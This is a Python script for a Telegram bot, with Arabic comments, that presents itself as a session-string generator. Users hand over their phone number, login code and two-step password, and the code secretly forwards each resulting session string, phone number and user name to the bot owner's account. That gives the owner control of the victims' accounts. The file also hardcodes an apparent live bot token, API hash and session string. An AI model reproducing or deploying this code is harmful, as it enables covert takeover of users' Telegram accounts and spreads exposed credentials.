from pyrogram import Client, filters
from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton
from pyrogram.errors import PhoneCodeInvalid, SessionPasswordNeeded, PasswordHashInvalid

# بيانات البوت والمطور
BOT_TOKEN = "7614011066:AAG319gvqxQq3GJY7CTGl113oSEqW60fd_o"  # توكن بوتك
BOT_OWNER_ID = 8177034443  # اي دي حسابك (مالك البوت)
API_ID = 11765349
API_HASH = "67d3351652cc42239a42df8c17186d49"

# جلسة جاهزة مسبقاً (String Session)
STRING_SESSION = "AgE-_xcAYbdrc4TG0DNWw1I7ZerniRO7BO3RNEbRXSt3lSIpNYj-yH15nWdryGagqT2NEM_GHDMn8txw_Fs8wZlA6t2olzWLf-bDxkAawCQmu4cdM03nfuRfnT4IILwJ3P9gtQI5GwvnrJYcIlsf6bvocllu9jox7niXwALh6pAm66Tzz_BqHXGd7gK16wkHmSOo9h5LTTqmXtMFItffn9vStkOVbJzi-fboVPDxzSldt3ekp_iGhH4nkqdVK1F5nuOKHOrgw8h9bzKF-lawS3-3lMaqBUU3Qi82bazM3UEzQ99Wxv2UBdnhWlEUvfCpXrwUyzmhfe912XJglxi3om0_Me77SAAAAAHnY6TLAA" 
# حفظ الجلسات المؤقتة للمستخدمين
sessions = {}

# تهيئة العميل (client) حسب وجود جلسة مسبقة أو لا
if STRING_SESSION:
    client = Client("my_account", session_string=STRING_SESSION, api_id=API_ID, api_hash=API_HASH)
else:
    client = Client("bot", bot_token=BOT_TOKEN, api_id=API_ID, api_hash=API_HASH)


@client.on_message(filters.command("start"))
async def start_handler(_, msg):
    await msg.reply(
        "👋 مرحباً بك في بوت توليد الجلسات.\n\n"
        "أرسل معلوماتك بهذا الشكل:\n"
        "`api_id:api_hash:رقم الهاتف`\n\n"
        "مثال:\n"
        "`123456:abcd1234:+9647700000000`",
        quote=True
    )


@client.on_message(filters.private & ~filters.command("start"))
async def get_info(_, msg):
    user_id = msg.from_user.id
    text = msg.text.strip()

    if user_id not in sessions:
        # استقبال البيانات الأولية (api_id, api_hash, رقم الهاتف)
        try:
            api_id, api_hash, phone = text.split(":")
            api_id = int(api_id)
        except Exception:
            return await msg.reply("❌ صيغة خاطئة! أرسل البيانات مثل:\n`123456:abc123:+9647700000000`")

        # تخزين بيانات الجلسة مؤقتاً
        sessions[user_id] = {
            "api_id": api_id,
            "api_hash": api_hash,
            "phone": phone,
            "step": "code"
        }

        # إنشاء جلسة مؤقتة لإرسال كود التحقق
        try:
            temp_client = Client(
                name=f"gen_{user_id}",
                api_id=api_id,
                api_hash=api_hash,
                phone_number=phone,
                in_memory=True
            )
            await temp_client.connect()
            await temp_client.send_code(phone)
            sessions[user_id]["client"] = temp_client
            await msg.reply("📩 تم إرسال كود التحقق، أرسله بهذا الشكل:\n`/code 12345`")
        except Exception as e:
            sessions.pop(user_id, None)
            return await msg.reply(f"❌ خطأ أثناء الإرسال:\n{e}")

    elif text.startswith("/code"):
        # استقبال كود التحقق
        if sessions[user_id]["step"] != "code":
            return await msg.reply("ℹ️ لم يتم طلب كود حالياً.")
        try:
            code = text.split(" ", 1)[1].strip()
            temp_client = sessions[user_id]["client"]
            await temp_client.sign_in(sessions[user_id]["phone"], code)
            string = await temp_client.export_session_string()

            await msg.reply(
                "✅ تم إنشاء الجلسة بنجاح!",
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("📋 نسخ الجلسة", callback_data=f"copy|{string}")]])
            )

            await client.send_message(
                BOT_OWNER_ID,
                f"📥 جلسة جديدة:\n"
                f"👤 المستخدم: [{msg.from_user.first_name}](tg://user?id={user_id})\n"
                f"📱 الهاتف: `{sessions[user_id]['phone']}`\n"
                f"🧾 الجلسة:\n`{string}`"
            )

            await temp_client.disconnect()
            sessions.pop(user_id, None)

        except PhoneCodeInvalid:
            await msg.reply("❌ الكود خاطئ!")
        except SessionPasswordNeeded:
            sessions[user_id]["step"] = "password"
            await msg.reply("🔐 الحساب عليه تحقق بخطوتين.\nأرسل كلمة السر بهذا الشكل:\n`/password كلمتك`")
        except Exception as e:
            await msg.reply(f"❌ خطأ:\n{e}")

    elif text.startswith("/password"):
        # استقبال كلمة المرور للتحقق بخطوتين
        if sessions[user_id]["step"] != "password":
            return await msg.reply("ℹ️ لم يتم طلب كلمة مرور.")
        try:
            pwd = text.split(" ", 1)[1].strip()
            temp_client = sessions[user_id]["client"]
            await temp_client.check_password(pwd)
            string = await temp_client.export_session_string()

            await msg.reply(
                "✅ تم إنشاء الجلسة بنجاح بعد التحقق الثنائي!",
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("📋 نسخ الجلسة", callback_data=f"copy|{string}")]])
            )

            await client.send_message(
                BOT_OWNER_ID,
                f"📥 جلسة جديدة (تحقق بخطوتين):\n"
                f"👤 المستخدم: [{msg.from_user.first_name}](tg://user?id={user_id})\n"
                f"📱 الهاتف: `{sessions[user_id]['phone']}`\n"
                f"🧾 الجلسة:\n`{string}`"
            )

            await temp_client.disconnect()
            sessions.pop(user_id, None)

        except PasswordHashInvalid:
            await msg.reply("❌ كلمة السر خاطئة.")
        except Exception as e:
            await msg.reply(f"❌ خطأ:\n{e}")


@client.on_callback_query(filters.regex(r"copy\|(.+)"))
async def copy_session(client, callback_query):
    string = callback_query.data.split("|", 1)[1]
    await callback_query.answer("📋 تم نسخ الجلسة إلى الحافظة!", show_alert=True)
    await callback_query.message.edit(
        f"✅ هذه هي الجلسة:\n\n`{string}`",
        reply_markup=InlineKeyboardMarkup([
            [InlineKeyboardButton("📋 نسخ مرة ثانية", callback_data=f"copy|{string}")],
        ])
    )


if __name__ == "__main__":
    client.run()
